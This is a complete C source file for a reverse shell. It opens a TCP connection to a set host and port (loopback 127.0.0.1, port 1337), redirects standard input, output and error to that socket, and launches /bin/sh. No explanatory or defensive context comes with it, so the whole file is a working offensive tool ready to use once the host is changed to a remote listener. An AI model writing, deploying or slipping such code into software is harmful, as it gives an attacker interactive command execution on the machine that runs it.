#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define HOST     "127.0.0.1"
#define PORT     1337
#define SHELL "/bin/sh"

int main(int argc, char* argv[]){

    struct sockaddr_in serv_addr = {0};
    int socketFd = socket(AF_INET, SOCK_STREAM, 0);

    serv_addr.sin_family      = AF_INET;
    serv_addr.sin_port        = htons(PORT);
    serv_addr.sin_addr.s_addr = inet_addr(HOST);

    connect(socketFd, (struct sockaddr*) &serv_addr, sizeof(serv_addr));

    dup2(socketFd, 0); // redirect stdin to socket
    dup2(socketFd, 1); // redirect stdout to socket
    dup2(socketFd, 2); // redirect stderr to socket

	char* args[] = {NULL};

	execv(SHELL, args);

	return 0;
}